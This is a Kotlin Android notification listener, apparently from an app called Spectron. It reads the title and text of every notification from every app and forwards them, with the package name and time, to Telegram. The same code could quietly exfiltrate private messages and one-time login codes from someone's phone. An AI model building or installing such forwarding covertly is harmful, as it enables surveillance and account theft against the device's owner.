package com.spectron.notify

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SpectronNotificationListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (!Prefs.enabled(this)) return

        val e = sbn.notification?.extras ?: return
        val title = e.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim().orEmpty()
        val text = e.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
            .ifBlank { e.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim().orEmpty() }

        if (title.isBlank() && text.isBlank()) return

        val time = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(Date(sbn.postTime))

        val msg = buildString {
            append("SPECTRON NOTIFY\n\n")
            append("App: ").append(sbn.packageName).append('\n')
            if (title.isNotBlank()) append("Title: ").append(title).append('\n')
            if (text.isNotBlank()) append("Notification: ").append(text).append('\n')
            append("Time: ").append(time)
        }

        Telegram.send(applicationContext, msg)
    }
}
